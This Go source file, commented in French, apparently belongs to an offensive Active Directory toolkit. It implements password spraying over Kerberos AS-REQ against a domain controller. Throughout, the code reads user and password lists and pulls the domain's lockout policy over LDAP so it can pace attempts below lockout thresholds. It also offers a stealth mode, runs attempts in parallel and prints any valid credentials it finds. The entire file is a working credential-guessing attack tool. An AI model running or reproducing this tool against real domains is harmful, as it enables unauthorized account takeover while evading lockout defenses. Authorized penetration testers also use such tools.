// pkg/spray/spray.go
//
// Password spraying avec protection anti-lockout intégrée.
//
// CORRECTION principale : le RateLimiter de ratelimit.go est maintenant
// utilisé pour calculer les délais, en prenant en compte la politique
// de lockout réelle du domaine récupérée via LDAP.

package spray

import (
	"bufio"
	"context"
	"fmt"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"adgo/pkg/ldap"

	"github.com/jcmturner/gokrb5/v8/client"
	"github.com/jcmturner/gokrb5/v8/config"
)

// SprayConfig configuration du password spraying
type SprayConfig struct {
	UsersFile     string
	PasswordsFile string
	Domain        string
	DCIP          string
	Delay         int // Délai de base (secondes). 0 = auto-calculé depuis la policy
	Jitter        int // Variation aléatoire (%). Recommandé : 10-30
	Threads       int // Threads parallèles. ATTENTION : >1 augmente le risque de lockout
	Verbose       bool
	LockoutCheck  bool // Vérifier la politique de lockout avant (recommandé)
	StopOnSuccess bool
	Mode          RateLimitMode // ModeSafe (défaut), ModeStealth, ModeAdaptive
}

// SprayResult résultat d'une tentative
type SprayResult struct {
	Username  string
	Password  string
	Success   bool
	Error     string
	Timestamp time.Time
}

// SpraySummary résumé global
type SpraySummary struct {
	TotalAttempts   int
	SuccessfulCreds []SprayResult
	FailedAttempts  int
	LockedAccounts  []string
	Duration        time.Duration
	StartTime       time.Time
	EndTime         time.Time
	LockoutPolicy   *LockoutPolicy // politique utilisée
	RateLimiter     *RateLimiter   // limiter utilisé
}

// PasswordSpray exécute un password spray avec protection anti-lockout réelle.
//
// Stratégie : spray UN mot de passe sur TOUS les users → pause → mot de passe suivant.
// Le délai est calculé depuis la politique de lockout du domaine si disponible.
func PasswordSpray(cfg *SprayConfig) (*SpraySummary, error) {
	summary := &SpraySummary{
		StartTime: time.Now(),
	}

	// 1. Charger les listes
	users, err := loadLines(cfg.UsersFile)
	if err != nil {
		return nil, fmt.Errorf("failed to load users from %s: %v", cfg.UsersFile, err)
	}
	passwords, err := loadLines(cfg.PasswordsFile)
	if err != nil {
		return nil, fmt.Errorf("failed to load passwords from %s: %v", cfg.PasswordsFile, err)
	}

	fmt.Printf("[*] Loaded %d users and %d passwords\n", len(users), len(passwords))

	// 2. Récupérer la politique de lockout
	var policy *LockoutPolicy
	if cfg.LockoutCheck {
		policy = fetchLockoutPolicy(cfg.Domain, cfg.DCIP)
		summary.LockoutPolicy = policy
	}

	// 3. Créer le RateLimiter avec la politique récupérée
	// CORRECTION : on utilise maintenant le RateLimiter de ratelimit.go
	rlCfg := &RateLimiterConfig{
		Mode:      cfg.Mode,
		Policy:    policy,
		JitterPct: cfg.Jitter,
	}

	// Si l'utilisateur a spécifié un délai explicite, il prend la priorité
	if cfg.Delay > 0 {
		rlCfg.CustomDelayMs = cfg.Delay * 1000
	}

	rl := NewRateLimiter(rlCfg)
	summary.RateLimiter = rl

	// Afficher la configuration de délai
	rl.PrintConfig()
	RecommendDelay(policy)
	fmt.Printf("[*] Estimated duration: %v\n\n",
		estimateDuration(len(users), len(passwords), int(rl.SafeDelay().Seconds())))

	// 4. Semaphore pour limiter la concurrence
	// ATTENTION : threads > 1 peut déclencher des lockouts sur les petits seuils
	threads := cfg.Threads
	if threads < 1 {
		threads = 1
	}
	if policy != nil && policy.Threshold <= 3 && threads > 1 {
		fmt.Printf("[!] Low lockout threshold (%d) — forcing threads=1 for safety\n", policy.Threshold)
		threads = 1
	}
	sem := make(chan struct{}, threads)

	// 5. Compteurs atomiques (thread-safe sans mutex)
	var totalAttempts int64
	var failedAttempts int64

	// Mutex uniquement pour les slices partagées (append non atomique)
	var mu sync.Mutex

	// Canal d'arrêt pour --stop-on-success
	stopCh := make(chan struct{})
	var stopped int32 // atomic flag

	// 6. Spray par mot de passe (pas par utilisateur — évite le lockout ciblé)
	for _, password := range passwords {
		// Vérifier si on doit s'arrêter
		if atomic.LoadInt32(&stopped) == 1 {
			break
		}

		fmt.Printf("[*] Spraying password: %s\n", maskPassword(password))

		var wg sync.WaitGroup
		// Compteur de lockouts pour cette passe
		var roundLockouts int64

		for _, username := range users {
			if atomic.LoadInt32(&stopped) == 1 {
				break
			}

			wg.Add(1)
			sem <- struct{}{}

			go func(user, pass string) {
				defer wg.Done()
				defer func() { <-sem }()

				// Délai AVANT la tentative (sauf pour le premier user)
				rl.Wait()

				start := time.Now()
				result := tryCredential(user, pass, cfg.Domain, cfg.DCIP)
				latency := time.Since(start)

				// Mettre à jour le rate limiter avec le résultat
				isLocked := result.Error == "account locked or disabled"
				rl.RecordResult(result.Success, latency, isLocked)

				atomic.AddInt64(&totalAttempts, 1)

				if result.Success {
					mu.Lock()
					summary.SuccessfulCreds = append(summary.SuccessfulCreds, result)
					mu.Unlock()

					printResult(result)

					if cfg.StopOnSuccess {
						if atomic.CompareAndSwapInt32(&stopped, 0, 1) {
							close(stopCh)
							fmt.Println("[+] Valid credential found — stopping spray")
						}
					}
				} else {
					atomic.AddInt64(&failedAttempts, 1)

					if cfg.Verbose {
						printResult(result)
					}

					if isLocked {
						atomic.AddInt64(&roundLockouts, 1)
						mu.Lock()
						summary.LockedAccounts = append(summary.LockedAccounts, result.Username)
						mu.Unlock()

						// Toujours afficher les lockouts (critique)
						printResult(result)
					}
				}
			}(username, password)
		}

		wg.Wait()

		// Si trop de lockouts sur cette passe → augmenter le délai et avertir
		if roundLockouts > 0 {
			fmt.Printf("[!] %d account(s) locked this round — consider increasing delay\n", roundLockouts)
			rl.RecordResult(false, 0, true)
		}

		if atomic.LoadInt32(&stopped) == 1 {
			break
		}

		// Pause entre chaque mot de passe (délai × 2 minimum)
		if len(passwords) > 1 {
			interPassDelay := rl.SafeDelay() * 2
			fmt.Printf("[*] Pausing %v before next password...\n", interPassDelay.Round(time.Second))
			timer := time.NewTimer(interPassDelay)
			select {
			case <-timer.C:
			case <-stopCh:
				timer.Stop()
			}
		}
	}

	summary.TotalAttempts = int(atomic.LoadInt64(&totalAttempts))
	summary.FailedAttempts = int(atomic.LoadInt64(&failedAttempts))
	summary.EndTime = time.Now()
	summary.Duration = summary.EndTime.Sub(summary.StartTime)

	return summary, nil
}

// fetchLockoutPolicy récupère la politique de lockout via LDAP.
// Retourne nil si non disponible (sans erreur fatale — le spray continue).
func fetchLockoutPolicy(domain, dcIP string) *LockoutPolicy {
	fmt.Println("[*] Fetching domain lockout policy via LDAP...")

	ldapURL := fmt.Sprintf("ldap://%s:389", dcIP)
	baseDN := domainToBaseDN(domain)

	ctx := context.Background()
	ldapClient, err := ldap.NewClient(ctx, ldapURL, "", "", false)
	if err != nil {
		// Essayer en bind anonyme
		fmt.Printf("[!] Anonymous LDAP failed: %v\n", err)
		fmt.Println("[!] Policy check skipped — using conservative defaults (30s delay)")
		return nil
	}
	defer ldapClient.Close()

	policy, err := ldapClient.GetPasswordPolicy(baseDN)
	if err != nil {
		fmt.Printf("[!] Could not read password policy: %v\n", err)
		fmt.Println("[!] Using conservative defaults (30s delay, assume threshold=5)")
		return nil
	}

	lockoutPolicy := &LockoutPolicy{
		Threshold:         policy.LockoutThreshold,
		ObservationWindow: time.Duration(policy.LockoutDurationMinutes) * time.Minute,
		LockoutDuration:   time.Duration(policy.LockoutDurationMinutes) * time.Minute,
	}

	fmt.Printf("[+] Lockout policy: threshold=%d | observation_window=%v | lockout_duration=%v\n",
		lockoutPolicy.Threshold,
		lockoutPolicy.ObservationWindow.Round(time.Minute),
		lockoutPolicy.LockoutDuration.Round(time.Minute),
	)

	if lockoutPolicy.Threshold == 0 {
		fmt.Println("[+] No lockout threshold — account lockout disabled on this domain")
	} else if lockoutPolicy.Threshold <= 3 {
		fmt.Printf("[!] WARNING: Very low lockout threshold (%d)! Use delay > %v\n",
			lockoutPolicy.Threshold,
			lockoutPolicy.ObservationWindow/time.Duration(lockoutPolicy.Threshold-1))
	}

	return lockoutPolicy
}

// tryCredential teste une combinaison user/password via Kerberos AS-REQ.
func tryCredential(username, password, domain, dcIP string) SprayResult {
	result := SprayResult{
		Username:  username,
		Password:  password,
		Timestamp: time.Now(),
	}

	realm := strings.ToUpper(domain)

	krb5Conf := fmt.Sprintf(`[libdefaults]
    default_realm = %s
    dns_lookup_kdc = false
    forwardable = true

[realms]
    %s = {
        kdc = %s:88
        admin_server = %s
    }

[domain_realm]
    .%s = %s
    %s = %s
`, realm, realm, dcIP, dcIP,
		strings.ToLower(domain), realm,
		strings.ToLower(domain), realm)

	cfg, err := config.NewFromString(krb5Conf)
	if err != nil {
		result.Error = fmt.Sprintf("krb5 config error: %v", err)
		return result
	}

	cl := client.NewWithPassword(username, realm, password, cfg,
		client.DisablePAFXFAST(true))

	err = cl.Login()
	if err == nil {
		result.Success = true
		return result
	}

	errStr := err.Error()
	switch {
	case strings.Contains(errStr, "KDC_ERR_PREAUTH_FAILED"):
		result.Error = "invalid credentials"
	case strings.Contains(errStr, "KDC_ERR_C_PRINCIPAL_UNKNOWN"):
		result.Error = "user not found"
	case strings.Contains(errStr, "KDC_ERR_CLIENT_REVOKED"):
		result.Error = "account locked or disabled"
	case strings.Contains(errStr, "KDC_ERR_KEY_EXPIRED"):
		result.Error = "password expired"
	case strings.Contains(errStr, "KDC_ERR_WRONG_REALM"):
		result.Error = "wrong domain/realm"
	case strings.Contains(errStr, "connection refused"):
		result.Error = fmt.Sprintf("KDC unreachable at %s:88", dcIP)
	default:
		result.Error = fmt.Sprintf("KDC: %v", err)
	}

	return result
}

// estimateDuration estime la durée totale du spray
func estimateDuration(users, passwords, delaySec int) time.Duration {
	if delaySec == 0 {
		delaySec = 30
	}
	totalAttempts := users * passwords
	totalSeconds := totalAttempts * delaySec
	pauseSeconds := (passwords - 1) * delaySec * 2
	return time.Duration(totalSeconds+pauseSeconds) * time.Second
}

// printResult affiche un résultat de façon formatée
func printResult(r SprayResult) {
	ts := r.Timestamp.Format("15:04:05")
	switch {
	case r.Success:
		fmt.Printf("[%s] [+] SUCCESS: %s:%s\n", ts, r.Username, r.Password)
	case r.Error == "account locked or disabled":
		fmt.Printf("[%s] [!] LOCKED:  %s\n", ts, r.Username)
	case r.Error == "user not found":
		fmt.Printf("[%s] [-] UNKNOWN: %s\n", ts, r.Username)
	default:
		fmt.Printf("[%s] [-] %s:%s — %s\n", ts, r.Username, maskPassword(r.Password), r.Error)
	}
}

// PrintSummary affiche un résumé du spray
func PrintSummary(summary *SpraySummary) {
	fmt.Println("\n" + strings.Repeat("=", 60))
	fmt.Println("PASSWORD SPRAY SUMMARY")
	fmt.Println(strings.Repeat("=", 60))
	fmt.Printf("Duration       : %v\n", summary.Duration.Round(time.Second))
	fmt.Printf("Total Attempts : %d\n", summary.TotalAttempts)
	fmt.Printf("Successful     : %d\n", len(summary.SuccessfulCreds))
	fmt.Printf("Failed         : %d\n", summary.FailedAttempts)
	fmt.Printf("Locked         : %d\n", len(summary.LockedAccounts))

	if summary.LockoutPolicy != nil && summary.LockoutPolicy.Threshold > 0 {
		fmt.Printf("Lockout Policy : threshold=%d, window=%v\n",
			summary.LockoutPolicy.Threshold,
			summary.LockoutPolicy.ObservationWindow.Round(time.Minute))
	}

	if len(summary.SuccessfulCreds) > 0 {
		fmt.Println("\n[+] VALID CREDENTIALS:")
		for _, cred := range summary.SuccessfulCreds {
			fmt.Printf("    %s:%s\n", cred.Username, cred.Password)
		}
	}

	if len(summary.LockedAccounts) > 0 {
		fmt.Println("\n[!] LOCKED ACCOUNTS (potential false positives):")
		for _, account := range summary.LockedAccounts {
			fmt.Printf("    %s\n", account)
		}
	}

	fmt.Println(strings.Repeat("=", 60))
}

// ============================================================
// Helpers
// ============================================================

func loadLines(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			lines = append(lines, line)
		}
	}
	if err := scanner.Err(); err != nil {
		return nil, err
	}
	if len(lines) == 0 {
		return nil, fmt.Errorf("file %s is empty", filename)
	}
	return lines, nil
}

func maskPassword(password string) string {
	if len(password) <= 3 {
		return "***"
	}
	return password[:2] + strings.Repeat("*", len(password)-2)
}

func domainToBaseDN(domain string) string {
	parts := strings.Split(domain, ".")
	dnParts := make([]string, len(parts))
	for i, part := range parts {
		dnParts[i] = "DC=" + part
	}
	return strings.Join(dnParts, ",")
}
